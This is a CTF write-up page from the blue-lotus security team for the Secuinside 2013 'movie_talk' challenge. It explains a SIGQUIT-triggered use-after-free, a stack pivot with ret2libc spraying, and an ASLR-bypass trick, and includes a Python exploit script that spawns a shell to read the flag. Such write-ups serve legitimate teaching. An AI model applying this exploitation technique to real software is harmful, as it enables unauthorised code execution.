@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>secuinside CTF 2013 quals movie_talk writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="The program is a local console application that maintain information about movies. It provides add, delete, list operations for users. We noticed &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-movie_talk-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Secuinside CTF 2013 Quals Movie_talk Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-11T00:00:00+08:00" pubdate data-updated="true">Jun 11<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>The program is a local console application that maintain information about movies. It provides add, delete, list operations for users. We noticed that there is a SIGQUIT(number 3) handler to free all allocated data structure of movies, but it failed to clean the pointers of movies, which leads to a use after free bug. Data structure of a movie is as below:</p>
+
+<pre><code>struct Movie
+{
+  void *handler;
+  char *name;
+  int id;
+  int rating;
+  int rate
+};
+</code></pre>
+
+<p>For each movie, the memories for the <code>Movie</code> struct and <code>Movie-&gt;name</code> are allocated on the heap. First, we can add a movie. Then, we add the second. However, at the moment before the program prompt to get movie name, we send SIGQUIT and get the first movie structure freed. Then the program get back to receive the second movie&#8217;s name. If we input a string with a appropriate length, the allocated chunk for the second movie&#8217;s name could be the same as the first movie&#8217;s struct, which has just been freed. Luckily, the pointer of the first movie still points to the original chunk. Thus, the first 4 bytes of the second movie&#8217;s name will become the first movie&#8217;s handler, which can be used controlled.</p>
+
+<p>We use an <code>add esp</code> gadget to migrate the stack to a very high position of the stack. Then we put a lot of common <code>ret2libc</code> combinations <code>system|system|"/bin/sh"|"/bin/sh"</code> in an environment variable, which is right in the higher part of the stack. If the <code>add esp</code> gadget migrate the stack top and hit the one of the <code>system</code> addresses in the environment variable, a shell will be spawned.</p>
+
+<p>Of course, we used the <code>ulimit -s unlimited</code> trick to disable ASLR of the shared library. We get the precise address of <code>system</code> and <code>"/binsh"</code> from the libc library. The environment variable defined by us is as below:</p>
+
+<pre><code>export EXPLOIT=$(python -c 'print "a"*9 + "\x80\xb2\x06\x40\x80\xb2\x06\x40\xf8\x2f\x19\x40\xf8\x2f\x19\x40" * 2000+"a"*15')
+</code></pre>
+
+<p>Python script for exploitation is as below:</p>
+
+<pre><code>import sys
+import os
+import subprocess
+import signal
+import time
+p = subprocess.Popen("./movie_talk", stdin=subprocess.PIPE)
+# add $0x228c,%esp
+addesp = "\xed\x15\x14\x40"
+# add first movie
+p.stdin.write("1\n1\n1\n0\n")
+time.sleep(3);
+# add second movie
+p.stdin.write("1\n")
+time.sleep(1)
+# free all movies
+p.send_signal(3)
+p.stdin.write(addesp + "AAAABBB\n1\n0\n")
+time.sleep(3)
+# use after free
+p.stdin.write("3\n")
+time.sleep(1)
+# execute shell command
+p.stdin.write("cat key.txt\n")
+time.sleep(1)
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-11T00:00:00+08:00" pubdate data-updated="true">Jun 11<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-movie_talk-writeup/" data-via="" data-counturl="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-movie_talk-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/secuinside-2013-save_the_zombie-writeup/" title="Previous Post: Secuinside 2013 save_the_zombie writeup">&laquo; Secuinside 2013 save_the_zombie writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/def-con-ctf-qualifier-2013-3dub-1-writeup/" title="Next Post: DEF CON CTF Qualifier 2013 3dub 1 Writeup">DEF CON CTF Qualifier 2013 3dub 1 Writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
